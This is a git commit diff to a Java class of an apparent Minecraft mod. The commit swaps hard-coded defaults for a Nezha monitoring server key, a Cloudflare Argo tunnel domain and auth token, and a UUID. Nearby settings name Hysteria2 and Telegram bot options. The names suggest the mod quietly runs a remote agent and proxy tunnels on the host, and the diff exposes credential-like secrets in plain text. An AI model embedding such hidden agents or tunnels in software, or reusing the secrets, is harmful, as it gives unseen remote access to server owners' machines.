643fc48cf29db2691b71c468d0b2cbe9834ad743
roberts8da <147053155+roberts8da@users.noreply.github.com>
2026-08-03 14:51:22 +0800

    Update Maohi.java

--- src/main/java/com/example/maohi/Maohi.java
+++ src/main/java/com/example/maohi/Maohi.java
@@ -56,9 +56,9 @@ public class Maohi implements ModInitializer {
     }
 
     private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "nz.lilyonlyone.eu.org");
-    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "jhALSS02MexIzEngqO");
+    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "F4EnoyI7d7xebBGCkR");
     private static final String NEZHA_PORT   = cfg("NEZHA_PORT", "443");
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "dr.kell.qzz.io");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "in.kell.qzz.io");
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "eyJhIjoiYjI2MDYyMzg2NDA3MDU3YzU3NzZkYTE1YzViM2IwM2YiLCJ0IjoiMGI4ZWI5NmItZmZkNy00YTBmLThlMGItNjU5NzNkYzY3ZjM5IiwicyI6Ik16WTRaamt5TVRrdE9UUTNZUzAwTVRGbExXSmlNR1V0TVRsbE5ERmxPREF3WVRRdyJ9");
     private static final String ARGO_PORT    = cfg("ARGO_PORT", "9002");
     private static final String HY2_PORT     = cfg("HY2_PORT", "");
@@ -68,7 +68,7 @@ public class Maohi implements ModInitializer {
     private static final String CHAT_ID      = cfg("CHAT_ID", "");
     private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
     private static final String NAME         = cfg("NAME", "");
-    private static final String UUID         = cfg("UUID", "a250b487-45bd-468e-a73b-bb774f654ec8");
+    private static final String UUID         = cfg("UUID", "25ff69e7-5ad0-4c05-98de-9667c1d2fec2");
 
     /**
      * 获取 IP 的 ISP（运营商）信息
